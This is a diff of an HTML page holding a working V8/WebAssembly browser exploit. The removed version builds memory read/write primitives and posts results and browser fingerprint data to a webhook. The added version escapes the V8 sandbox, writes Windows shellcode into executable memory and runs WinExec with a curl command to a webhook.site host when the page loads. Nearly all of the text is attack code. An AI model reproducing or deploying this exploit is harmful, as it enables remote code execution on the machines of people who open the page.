@@ -1,371 +1,302 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <title>WASM Exploit with Exfil Callback</title>
-    <style>
-        body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; margin: 20px; line-height: 1.6; color: #333; }
-        h1 { color: #1a1a1a; }
-        code { background-color: #f0f0f0; padding: 0.2em 0.4em; margin: 0; font-size: 0.9em; border-radius: 3px; }
-        pre { background-color: #f4f4f4; padding: 15px; border: 1px solid #ddd; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; font-size: 0.9em; }
-        .warning { color: #c0392b; background-color: #f9ebea; border: 1px solid #e74c3c; padding: 10px; border-radius: 4px; margin-bottom: 15px;}
-        .info { color: #2980b9; background-color: #eaf2f8; border: 1px solid #3498db; padding: 10px; border-radius: 4px; margin-bottom: 15px;}
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>exploit</title>
 </head>
+
 <body>
-    <h1>WASM Exploit Attempt with Exfiltration Callback</h1>
-    <p>This page attempts to run the provided JavaScript PoC. After setting up primitives, it will try to get a sample data point using <code>addrOf</code> and send it to a webhook.</p>
-
-    <div class="warning">
-        <strong>IMPORTANT PRECONDITION:</strong> This script critically assumes that a fully functional <code>WasmModuleBuilder</code> class and all its associated WebAssembly constants and helper functions (e.g., <code>makeField</code>, <code>kWasmI64</code>, <code>kGCPrefix</code>, <code>kExprStructNew</code>, etc.) are ALREADY DEFINED and correctly implemented in the global scope or are otherwise accessible to this script module. These are typically part of a specific WebAssembly testing harness.
-        <strong>Without these essential Wasm utilities provided by the execution environment, this script will NOT function as intended, and the exploit will fail. This HTML file does NOT provide these Wasm utilities.</strong>
-    </div>
-
-    <div class="info">
-        Check the browser's developer console for detailed logs. A status report, including the sample "exfiltrated" data (result of <code>addrOf</code> on a test object), will be sent to:
-        <br><code>https://webhook.site/9244dddb-e965-48d6-9176-809edc7b238c</code>
-    </div>
-
-    <hr>
-    <h2>Live Console Output (from this script):</h2>
-    <pre id="consoleOutput">Initializing script execution...
-</pre>
-<script src="https://0xksdata.github.io/webhooktest/wasm.js"></script>
-    <script type="module">
-        const consoleOutputElement = document.getElementById('consoleOutput');
-        const originalConsoleLog = console.log;
-        const originalConsoleError = console.error;
-
-        function appendToConsole(type, ...args) {
-            const message = args.map(arg => {
-                if (typeof arg === 'object' && arg !== null) {
-                    try { return JSON.stringify(arg); } catch (e) { return arg.toString(); }
-                }
-                return String(arg);
-            }).join(' ');
-            consoleOutputElement.textContent += (type === 'error' ? 'ERROR: ' : '') + message + '\\n';
-             // Auto-scroll
-            consoleOutputElement.scrollTop = consoleOutputElement.scrollHeight;
-        }
-
+  <textarea id="log" rows="30" cols="120"
+    style="font-family: Consolas,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace;"></textarea>
+  <script src="wasm.js"></script>
+<script>
+    async function exp() {
+      function hookLog() {
+        const logTextarea = window.log;
+        const ConsoleLog = console.log;
+        console.realLog = ConsoleLog;
         console.log = (...args) => {
-            originalConsoleLog.apply(console, args);
-            appendToConsole('log', ...args);
+          logTextarea.value += args.join(' ') + '\n';
+          ConsoleLog.apply(console, args);
         };
-        console.error = (...args) => {
-            originalConsoleError.apply(console, args);
-            appendToConsole('error', ...args);
-        };
+      }
 
-        // --- Start of User's Script (with BigInt syntax correction) ---
-        // WasmModuleBuilder etc. must be globally available.
+      hookLog();
 
-        function cagedrw_factory(tieringBudget) {
-            function func(obj) {
-                return obj;
-            }
+      function func(obj) {
+        return obj;
+      }
 
-            let builder_0 = new WasmModuleBuilder();
-            let $s0_0 = builder_0.addStruct([makeField(kWasmI64, true)]);
-            let $s1_0 = builder_0.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_0), true)]);
-            let $sig_s1_ar_0 = builder_0.addType(makeSig([kWasmAnyRef], [wasmRefType($s1_0)]));
-            let $i_0 = builder_0.addImport('import', 'func', $sig_s1_ar_0);
-            builder_0.addTable(wasmRefType($sig_s1_ar_0), 1, 1, [kExprRefFunc, $i_0]).exportAs('table');
+      // builder 0: export []->[ref 1]
+      let builder_0 = new WasmModuleBuilder();
+      let $s0_0 = builder_0.addStruct([makeField(kWasmI32, true)]);
+      let $s1_0 = builder_0.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_0), true)]);
+      let $sig_s1_ar_0 = builder_0.addType(makeSig([kWasmAnyRef], [wasmRefType($s1_0)]));
+      let $i_0 = builder_0.addImport('import', 'func', $sig_s1_ar_0);
+      let $t_0 = builder_0.addTable(wasmRefType($sig_s1_ar_0), 1, 1, [kExprRefFunc, $i_0]).exportAs('table');
 
+      let instance_0 = builder_0.instantiate({import: {func}});
+      let {table} = instance_0.exports;
 
-            let instance_0 = builder_0.instantiate({
-                import: {
-                    func
-                }
-            });
-            let {
-                table
-            } = instance_0.exports;
+      // builder 1: import []->[ref 2], wrapper miscompilation into []->[ref 1]
+      let builder_1 = new WasmModuleBuilder();
+      let $s0_1 = builder_1.addStruct([makeField(kWasmI32, true)]);
+      let $s1_1 = builder_1.addStruct([makeField(kWasmExternRef, true), makeField(kWasmI32, true)]);      // src type
+      let $s2_1 = builder_1.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_1), true)]);  // tgt type, equiv. $s1_0
+      let $sig_s2_ar_1 = builder_1.addType(makeSig([kWasmAnyRef], [wasmRefType($s2_1)]));                 // equiv. $sig_s1_ar_0
+      let $sig_v_v_1 = builder_1.addType(kSig_v_v);
+      let $sig_i_r_1 = builder_1.addType(kSig_i_r);
+      let $sig_i_i_1 = builder_1.addType(kSig_i_i);
+      let $sig_v_ii_1 = builder_1.addType(kSig_v_ii);
+      let $t_1 = builder_1.addImportedTable('import', 'table', 1, 1, wasmRefType($sig_s2_ar_1));
 
-            let builder = new WasmModuleBuilder();
+      // loop until we detect type incompatibility due to tierup
+      builder_1.addFunction('tierup', $sig_v_v_1).addLocals(wasmRefType($s2_1), 1).addBody([
+        // local.set 0 w/ ref $s2_1
+        ...wasmI32Const(0),
+        kGCPrefix, kExprStructNewDefault, $s0_1,
+        kGCPrefix, kExprStructNew, $s2_1,
+        kExprLocalSet, 0,
 
-            let $s0_1 = builder.addStruct([makeField(kWasmI64, true)]);
-            let $s1_1 = builder.addStruct([makeField(kWasmExternRef, true), makeField(kWasmI32, true)]);
-            let $s2_1 = builder.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_1), true)]);
+        kExprLoop, kWasmVoid,
+          // call table[0][0]
+          kExprLocalGet, 0,
+          ...wasmI32Const(0),
+          kExprCallIndirect, $sig_s2_ar_1, $t_1,
+          kExprDrop,
+          kExprBr, 0,
+        kExprEnd,
+      ]).exportFunc();
 
-            let $sig_s2_ar_1 = builder.addType(makeSig([kWasmAnyRef], [wasmRefType($s2_1)]));
-            let $t_1 = builder.addImportedTable('import', 'table', 1, 1, wasmRefType($sig_s2_ar_1));
+      builder_1.addFunction('addrof', $sig_i_r_1).addBody([
+        kExprLocalGet, 0,
+        ...wasmI32Const(0),
+        kGCPrefix, kExprStructNew, $s1_1,
+        ...wasmI32Const(0),
+        kExprCallIndirect, $sig_s2_ar_1, $t_1,
+        kGCPrefix, kExprStructGet, $s2_1, 0,
+      ]).exportFunc();
 
-            builder.addFunction('tierup', makeSig([], [])).addLocals(wasmRefType($s2_1), 1).addBody([
-                ...wasmI32Const(0),
-                kGCPrefix, kExprStructNewDefault, $s0_1,
-                kGCPrefix, kExprStructNew, $s2_1,
-                kExprLocalSet, 0,
-                kExprLocalGet, 0,
-                ...wasmI32Const(0),
-                kExprCallIndirect, $sig_s2_ar_1, $t_1,
-                kExprDrop,
-                kExprLocalGet, 0,
-                ...wasmI32Const(0),
-                kExprCallIndirect, $sig_s2_ar_1, $t_1,
-                kExprDrop,
-            ]).exportFunc();
+      builder_1.addFunction('caged_read', $sig_i_i_1).addBody([
+        kExprRefNull, kNullExternRefCode,
+        kExprLocalGet, 0,
+        ...wasmI32Const(7),
+        kExprI32Sub,
+        kGCPrefix, kExprStructNew, $s1_1,
+        ...wasmI32Const(0),
+        kExprCallIndirect, $sig_s2_ar_1, $t_1,
+        kGCPrefix, kExprStructGet, $s2_1, 1,
+        kGCPrefix, kExprStructGet, $s0_1, 0,
+      ]).exportFunc();
 
-            builder.addFunction('cagedRead', makeSig([kWasmI32], [kWasmI64])).addLocals(wasmRefType($s1_1), 1).addBody([
-                kExprRefNull, kNullExternRefCode,
-                kExprLocalGet, 0,
-                ...wasmI32Const(7),
-                kExprI32Sub,
-                kGCPrefix, kExprStructNew, $s1_1,
-                kExprLocalSet, 1,
-                kExprLocalGet, 1,
-                ...wasmI32Const(0),
-                kExprCallIndirect, $sig_s2_ar_1, $t_1,
-                kGCPrefix, kExprStructGet, $s2_1, 1,
-                kGCPrefix, kExprStructGet, $s0_1, 0,
-            ]).exportFunc();
+      builder_1.addFunction('caged_write', $sig_v_ii_1).addBody([
+        kExprRefNull, kNullExternRefCode,
+        kExprLocalGet, 0,
+        ...wasmI32Const(7),
+        kExprI32Sub,
+        kGCPrefix, kExprStructNew, $s1_1,
+        ...wasmI32Const(0),
+        kExprCallIndirect, $sig_s2_ar_1, $t_1,
+        kGCPrefix, kExprStructGet, $s2_1, 1,
+        kExprLocalGet, 1,
+        kGCPrefix, kExprStructSet, $s0_1, 0,
+      ]).exportFunc();
 
-            builder.addFunction('cagedWrite', makeSig([kWasmI32, kWasmI64], [])).addBody([
-                kExprRefNull, kNullExternRefCode,
-                kExprLocalGet, 0,
-                ...wasmI32Const(7),
-                kExprI32Sub,
-                kGCPrefix, kExprStructNew, $s1_1,
-                ...wasmI32Const(0),
-                kExprCallIndirect, $sig_s2_ar_1, $t_1,
-                kGCPrefix, kExprStructGet, $s2_1, 1,
-                kExprLocalGet, 1,
-                kGCPrefix, kExprStructSet, $s0_1, 0,
-            ]).exportFunc();
+      let instance_1 = builder_1.instantiate({import: {table}});
+      let {tierup, addrof, caged_read, caged_write} = instance_1.exports;
 
-            let instance = builder.instantiate({
-                import: {
-                    table
-                }
-            });
-            for (let x = 0; x < tieringBudget; x++) {
-                instance.exports.tierup();
-            }
+      try {
+        tierup();
+      } catch {}
 
-            return {
-                cagedRead: (addr) => instance.exports.cagedRead(Number(addr) - 1),
-                cagedWrite: (addr, value) => instance.exports.cagedWrite(Number(addr) - 1, value),
-            };
+      // now follows v8sbx escape, using b/350292240 (rtt subtype check bypass, copy-pasted from b/351327767 & b/360533914 & b/368241697)
+      {
+        let builder = new WasmModuleBuilder();
+        let $struct = builder.addStruct([makeField(kWasmI64, true)]);
+        let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
+        let $sig_l_s = builder.addType(makeSig([wasmRefType($struct)], [kWasmI64]));
+        let $sig_l_ll = builder.addType(makeSig([kWasmI64, kWasmI64], [kWasmI64]), kNoSuperType, false);
+        let $sig_v_v = builder.addType(kSig_v_v);
+        let $sig_lX_v = builder.addType(makeSig([], Array(32).fill(kWasmI64)), kNoSuperType, false);
+        let $sig_v_i = builder.addType(kSig_v_i);
+        let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
+        let $sig_r_v = builder.addType(kSig_r_v);
+        let $g = builder.addGlobal(kWasmI64, true);
+        let $writer = builder.addFunction("writer", $sig_v_ls)
+          .exportFunc()
+          .addBody([
+            kExprLocalGet, 1,
+            kExprLocalGet, 0,
+            kGCPrefix, kExprStructSet, $struct, 0,
+          ]);
+        let $reader = builder.addFunction("reader", $sig_l_s)
+          .exportFunc()
+          .addBody([
+            kExprLocalGet, 0,
+            kGCPrefix, kExprStructGet, $struct, 0,
+          ]);
+        let $boom = builder.addFunction("boom", $sig_l_ll)
+          .exportFunc()
+          .addBody([
+            kExprLocalGet, 1,
+            kExprLocalGet, 0,
+            kExprI32Const, 0,
+            kExprCallIndirect, $sig_l_ll, 0,
+          ]);
+        let $nop = builder.addFunction("nop", $sig_v_v)
+          .exportFunc()
+          .addBody([
+          ]);
+        let $rec = builder.addFunction("rec", $sig_v_i)
+          .exportFunc();
+        $rec.addBody([
+          kExprBlock, kWasmVoid,
+          kExprLocalGet, 0,
+          kExprI32Const, 1,
+          kExprI32Sub,
+          kExprLocalTee, 0,
+          kExprI32Eqz,
+          kExprBrIf, 0,
+          kExprLocalGet, 0,
+          kExprCallFunction, $rec.index,
+          ...Array(0x100).fill(0).flatMap(
+            (_, idx) => [
+              ...wasmI64Const(0x123456789abcdef0n + BigInt(idx)), kExprGlobalSet, $g.index
+            ]
+          ),
+          kExprEnd,
+        ]);
+        let $leak = builder.addFunction("leak", $sig_lX_v)
+          .exportFunc()
+          .addBody([
+            kExprI32Const, 0,
+            kExprCallIndirect, $sig_lX_v, 0,
+          ]);
+        let $leak_wrap = builder.addFunction("leak_rec", $sig_lX_v)
+          .exportFunc()
+          .addBody([
+            kExprI32Const, 0x30,
+            kExprCallFunction, $rec.index,
+            kExprCallFunction, $leak.index,
+          ])
+        let $get_writer = builder.addFunction("get_writer", kSig_r_v)
+          .exportFunc()
+          .addBody([
+            kExprRefFunc, $writer.index,
+            kGCPrefix, kExprStructNew, $box,
+            kGCPrefix, kExprExternConvertAny,
+          ]);
+        let $get_reader = builder.addFunction("get_reader", kSig_r_v)
+          .exportFunc()
+          .addBody([
+            kExprRefFunc, $reader.index,
+            kGCPrefix, kExprStructNew, $box,
+            kGCPrefix, kExprExternConvertAny,
+          ]);
+        let $get_boom = builder.addFunction("get_boom", kSig_r_v)
+          .exportFunc()
+          .addBody([
+            kExprRefFunc, $boom.index,
+            kGCPrefix, kExprStructNew, $box,
+            kGCPrefix, kExprExternConvertAny,
+          ]);
+        let $get_nop = builder.addFunction("get_nop", kSig_r_v)
+          .exportFunc()
+          .addBody([
+            kExprRefFunc, $nop.index,
+            kGCPrefix, kExprStructNew, $box,
+            kGCPrefix, kExprExternConvertAny,
+          ]);
+        let $get_leak = builder.addFunction("get_leak", kSig_r_v)
+          .exportFunc()
+          .addBody([
+            kExprRefFunc, $leak.index,
+            kGCPrefix, kExprStructNew, $box,
+            kGCPrefix, kExprExternConvertAny,
+          ]);
+        let $table =
+          builder.addTable(kWasmFuncRef, 1, 1, [kExprRefFunc, $writer.index]).exportAs("table");
+
+        let instance = builder.instantiate();
+        let { writer, reader, boom, nop, rec, leak, leak_rec, get_reader, get_writer, get_boom, get_nop, get_leak, table } = instance.exports;
+
+        // Prepare corruption utilities.
+        const kHeapObjectTag = 1;
+        const kStructField0Offset = 8;
+        const kMapOffset = 0;
+        const kFuncRefMapTypeInfoOffset = 0x14;
+        const kTypeInfoSupertypesOffset = 0x14;
+        const MASK64 = (1n << 64n) - 1n;
+        function getPtr(obj) {
+          return addrof(obj);
+        }
+        function getField(obj, offset) {
+          return caged_read(obj + offset - kHeapObjectTag);
+        }
+        function setField(obj, offset, value) {
+          caged_write(obj + offset - kHeapObjectTag, value);
         }
 
-        function addrOf_factory(tieringBudget, cagedRead) {
-            function func(obj) {
-                return obj;
-            }
+        // box: WASM_STRUCT_TYPE
+        function set_supertype(sub_box, sup_box) {
+          let funcref_sub = getField(getPtr(sub_box), kStructField0Offset); // WASM_FUNC_REF_TYPE
+          let map_sub = getField(funcref_sub, kMapOffset);                  // Map of WASM_FUNC_REF_TYPE
+          let typeinfo_sub = getField(map_sub, kFuncRefMapTypeInfoOffset);  // WASM_TYPE_INFO_TYPE
 
-            let builder_0 = new WasmModuleBuilder();
-            let $s0_0 = builder_0.addStruct([makeField(kWasmI64, true), makeField(kWasmI64, true), makeField(kWasmI64, true), makeField(kWasmI64, true)]);
-            let $s1_0 = builder_0.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_0), true)]);
-            let $sig_s1_ar_0 = builder_0.addType(makeSig([kWasmAnyRef], [wasmRefType($s1_0)]));
-            let $i_0 = builder_0.addImport('import', 'func', $sig_s1_ar_0);
-            builder_0.addTable(wasmRefType($sig_s1_ar_0), 1, 1, [kExprRefFunc, $i_0]).exportAs('table');
+          let funcref_sup = getField(getPtr(sup_box), kStructField0Offset);
+          let map_sup = getField(funcref_sup, kMapOffset);
 
-
-            let instance_0 = builder_0.instantiate({
-                import: {
-                    func
-                }
-            });
-            let {
-                table
-            } = instance_0.exports;
-
-            let builder = new WasmModuleBuilder();
-
-            let $s0_1 = builder.addStruct([makeField(kWasmI64, true), makeField(kWasmI64, true), makeField(kWasmI64, true), makeField(kWasmI64, true)]);
-            let $s1_1 = builder.addStruct([makeField(kWasmExternRef, true), makeField(kWasmExternRef, true)]);
-            let $s2_1 = builder.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_1), true)]);
-
-            let $sig_s2_ar_1 = builder.addType(makeSig([kWasmAnyRef], [wasmRefType($s2_1)]));
-            let $t_1 = builder.addImportedTable('import', 'table', 1, 1, wasmRefType($sig_s2_ar_1));
-
-            builder.addFunction('tierup', makeSig([], [])).addLocals(wasmRefType($s2_1), 1).addBody([
-                ...wasmI32Const(0),
-                kGCPrefix, kExprStructNewDefault, $s0_1,
-                kGCPrefix, kExprStructNew, $s2_1,
-                kExprLocalSet, 0,
-                kExprLocalGet, 0,
-                ...wasmI32Const(0),
-                kExprCallIndirect, $sig_s2_ar_1, $t_1,
-                kExprDrop,
-                kExprLocalGet, 0,
-                ...wasmI32Const(0),
-                kExprCallIndirect, $sig_s2_ar_1, $t_1,
-                kExprDrop,
-            ]).exportFunc();
-
-            builder.addFunction('addrOf', makeSig([kWasmExternRef], [kWasmI64])).addLocals(wasmRefType($s1_1), 1).addBody([
-                kExprRefNull, kNullExternRefCode,
-                kExprLocalGet, 0,
-                kGCPrefix, kExprStructNew, $s1_1,
-                kExprLocalSet, 1,
-                kExprLocalGet, 1,
-                ...wasmI32Const(0),
-                kExprCallIndirect, $sig_s2_ar_1, $t_1,
-                kGCPrefix, kExprStructGet, $s2_1, 1,
-                kGCPrefix, kExprStructGet, $s0_1, 0,
-            ]).exportFunc();
-
-            let instance = builder.instantiate({
-                import: {
-                    table
-                }
-            });
-            for (let x = 0; x < tieringBudget; x++) {
-                instance.exports.tierup();
-            }
-
-            let obj_arr = [{}, {}, {}, {}, {}, {}];
-            return {
-                addrOf: (obj) => {
-                    obj_arr[0] = obj;
-                    let backing_store_raw = instance.exports.addrOf(obj_arr);
-                    // Corrected BigInt syntax (no space before 'n')
-                    let backing_store = (typeof backing_store_raw === 'bigint' ? backing_store_raw : BigInt(backing_store_raw || 0)) & 0xffffffffn;
-                    
-                    let caged_read_result_raw = cagedRead(Number(backing_store + 0x08n));
-                    return (typeof caged_read_result_raw === 'bigint' ? caged_read_result_raw : BigInt(caged_read_result_raw || 0)) & 0xffffffffn;
-                }
-            };
+          // typeinfo_sub.supertypes[0] = map_sup
+          setField(typeinfo_sub, kTypeInfoSupertypesOffset, map_sup);
         }
 
-        // --- Modified execute function with exfil attempt and webhook callback ---
-        async function execute(version) { // Removed 'export' as it's called by IIFE in the same module scope
-            console.log('Executing PoC (CVE-2024-10230 related) - Version:', version);
+        set_supertype(get_writer(), get_boom());
+        set_supertype(get_reader(), get_boom());
+        set_supertype(get_nop(), get_leak());
 
-            let cagedRead, cagedWrite, addrOf;
-            let primitivesSuccess = false;
-            let setupErrorMessage = "";
-            const startTime = performance.now();
+        table.set(0, nop);
+        leak_rec();   // trigger initial liftoff compilation
+        let leaks = leak_rec();
 
-            try {
-                const rw_primitives = cagedrw_factory(500);
-                cagedRead = rw_primitives.cagedRead;
-                cagedWrite = rw_primitives.cagedWrite;
-                console.log('cagedrw_factory completed.');
-
-                if (typeof cagedRead !== 'function' || typeof cagedWrite !== 'function') {
-                    throw new Error("cagedRead or cagedWrite primitive not correctly created by cagedrw_factory.");
-                }
-
-                const ao_primitives = addrOf_factory(500, cagedRead);
-                addrOf = ao_primitives.addrOf;
-                console.log('addrOf_factory completed.');
-
-                if (typeof addrOf !== 'function') {
-                     throw new Error("addrOf primitive was not correctly created by addrOf_factory.");
-                }
-
-                primitivesSuccess = true;
-                console.log("Exploit primitives (cagedRead, cagedWrite, addrOf) appear to be successfully created.");
-
-            } catch (e) {
-                console.error("Error during exploit primitive creation:", e.name, e.message, e.stack);
-                setupErrorMessage = `${e.name}: ${e.message}`;
-            }
-
-            let exfiltratedDataSample = null;
-            let exfilAttemptError = "";
-
-            if (primitivesSuccess) {
-                try {
-                    console.log("Attempting to get sample exfiltrated data using addrOf primitive...");
-                    let testObj = { testProperty: "worstwursts_h1", randomNumber: Math.random() };
-                    let rawExfilData = addrOf(testObj); // addrOf itself calls cagedRead internally
-                    
-                    // Ensure consistent string representation for BigInt for JSON
-                    if (typeof rawExfilData === 'bigint') {
-                        exfiltratedDataSample = `0x${rawExfilData.toString(16)}n`; // e.g., "0xdeadbeefn"
-                    } else if (typeof rawExfilData === 'number') {
-                         exfiltratedDataSample = `0x${rawExfilData.toString(16)}`;
-                    } else {
-                        exfiltratedDataSample = String(rawExfilData);
-                    }
-                    console.log("Sample exfiltrated data (from addrOf(testObj)):", exfiltratedDataSample);
-                } catch (e) {
-                    console.error("Error attempting to get/use addrOf for exfiltrated data sample:", e.name, e.message, e.stack);
-                    exfilAttemptError = `${e.name}: ${e.message}`;
-                }
-            } else {
-                 console.warn("Skipping exfiltration attempt due to failure in primitive setup.");
-            }
-
-            const endTime = performance.now();
-            const executionTime = (endTime - startTime).toFixed(2); // Keep as string for now, convert to float later
-
-            const dataToSend = {
-                message: primitivesSuccess ? "Exploit execution attempt finished. Primitives created." : "Exploit execution attempt FAILED during primitive creation.",
-                exploit_id: "CVE-2024-10230_PoC_With_Exfil",
-                primitivesStatus: {
-                    createdSuccessfully: primitivesSuccess,
-                    cagedRead: typeof cagedRead === 'function',
-                    cagedWrite: typeof cagedWrite === 'function',
-                    addrOf: typeof addrOf === 'function',
-                },
-                setupError: setupErrorMessage,
-                exfiltrationAttempt: {
-                    dataSample: exfiltratedDataSample,
-                    error: exfilAttemptError,
-                },
-                context: {
-                    version_arg: version,
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    screenWidth: window.screen ? window.screen.width : undefined,
-                    screenHeight: window.screen ? window.screen.height : undefined,
-                    timestamp: new Date().toISOString(),
-                    executionTime_ms: parseFloat(executionTime)
-                }
-            };
-
-            const webhookUrl = 'https://webhook.site/2109ddc4-7a35-4606-8774-978bcdbcac8a';
-            console.log(`Sending data to webhook: ${webhookUrl}`);
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(dataToSend),
-                    mode: 'cors'
-                });
-
-                const responseText = await response.text();
-                if (response.ok) {
-                    console.log(`Data successfully sent to webhook. Status: ${response.status}.`);
-                    console.log('Webhook site response (first 200 chars):', responseText.substring(0,200) + (responseText.length > 200 ? "..." : ""));
-                } else {
-                    console.error(`Failed to send data to webhook. Status: ${response.status}. Response: ${responseText}`);
-                }
-            } catch (fetchError) {
-                console.error(`Network or other critical error sending data to webhook: ${webhookUrl}`, fetchError.name, fetchError.message);
-            }
-
-            return {
-                cagedRead: cagedRead,
-                cagedWrite: cagedWrite,
-                addrOf: addrOf,
-            };
+        function read(ptr) {
+          table.set(0, reader);
+          return boom(ptr - 0x7n, ptr - 0x7n) & MASK64;
+        }
+        function write(ptr, val) {
+          table.set(0, writer);
+          return boom(ptr - 0x7n, val);
         }
 
-        // --- Auto-execute on load ---
-        (async () => {
-            console.log("Document loaded. Starting auto-execution of PoC script with exfil attempt...");
-            try {
-                const primitives = await execute("poc_v1.2-html_exfil_callback");
-                console.log("Main 'execute' function completed.");
+        let exp_rwx = leaks[6];
+        let exp_rwx_end;
 
-                if (primitives && primitives.addrOf && primitives.cagedRead && primitives.cagedWrite) {
-                    console.log("All primitives (addrOf, cagedRead, cagedWrite) are functions. Exploit setup reported as successful.");
-                } else {
-                    console.warn("One or more exploit primitives were not available or setup failed after execution.");
-                }
-            } catch (err) {
-                console.error("Error in top-level auto-execution wrapper:", err.name, err.message, err.stack);
-            }
-            console.log("Auto-execution script part finished. Check console and webhook.");
-        })();
-    </script>
+        // 48 8b e5 5d c3 : mov rsp, rbp ; pop rbp ; ret
+        for (exp_rwx_end = exp_rwx; (read(exp_rwx_end) & 0xffffffffffn) != 0xc35de58b48n; exp_rwx_end += 1n);
 
+        console.log(`[+] exp_rwx:     ${exp_rwx.toString(16)}`);
+        console.log(`[+] exp_rwx_end: ${exp_rwx_end.toString(16)}`);
+
+        const sc = [0x48, 0x83, 0xe4, 0xf0, 0x55, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x2e, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8d, 0x15, 0xd7, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0xe8, 0x34, 0x00, 0x00, 0x00, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0xc9, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0x5d, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x20, 0xc3, 0x53, 0x57, 0x56, 0x41, 0x50, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x89, 0x54, 0x24, 0x30, 0x8b, 0x59, 0x3c, 0x48, 0x01, 0xcb, 0x8b, 0x9b, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xcb, 0x44, 0x8b, 0x43, 0x18, 0x8b, 0x7b, 0x20, 0x48, 0x01, 0xcf, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xc0, 0x4c, 0x39, 0xc6, 0x73, 0x43, 0x8b, 0x0c, 0xb7, 0x48, 0x03, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0x54, 0x24, 0x30, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x33, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x28, 0x48, 0x85, 0xc0, 0x74, 0x08, 0x48, 0x31, 0xc0, 0x48, 0xff, 0xc6, 0xeb, 0xd4, 0x48, 0x8b, 0x4c, 0x24, 0x28, 0x8b, 0x7b, 0x24, 0x48, 0x01, 0xcf, 0x48, 0x0f, 0xb7, 0x34, 0x77, 0x8b, 0x7b, 0x1c, 0x48, 0x01, 0xcf, 0x8b, 0x04, 0xb7, 0x48, 0x01, 0xc8, 0x41, 0x58, 0x5e, 0x5f, 0x5b, 0xc3, 0x53, 0x8a, 0x01, 0x8a, 0x1a, 0x84, 0xc0, 0x74, 0x0c, 0x38, 0xd8, 0x75, 0x08, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc2, 0xeb, 0xec, 0x28, 0xd8, 0x48, 0x0f, 0xbe, 0xc0, 0x5b, 0xc3, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00];
+        const cmd = 'curl https://7542355f-ddc6-4194-92bf-449518a9f9d2.webhook.site/rce';
+        for (let i = 0; i < cmd.length; i++) {
+          sc.push(cmd.charCodeAt(i));
+        }
+        do {
+          sc.push(0x00);
+        } while (sc.length % 8 != 0);
+
+        const sc_i64 = new BigInt64Array(new Uint8Array(sc).buffer);
+        for (let i = 0; i < sc_i64.length; i++) {
+          write(exp_rwx + BigInt(i) * 8n, sc_i64[i]);
+        }
+
+        // trigger shellcode
+        rec(2);
+        console.log(`[+] shellcode triggered!`);
+      }
+    }
+    window.onload = exp;
+  </script>
 </body>
-</html>
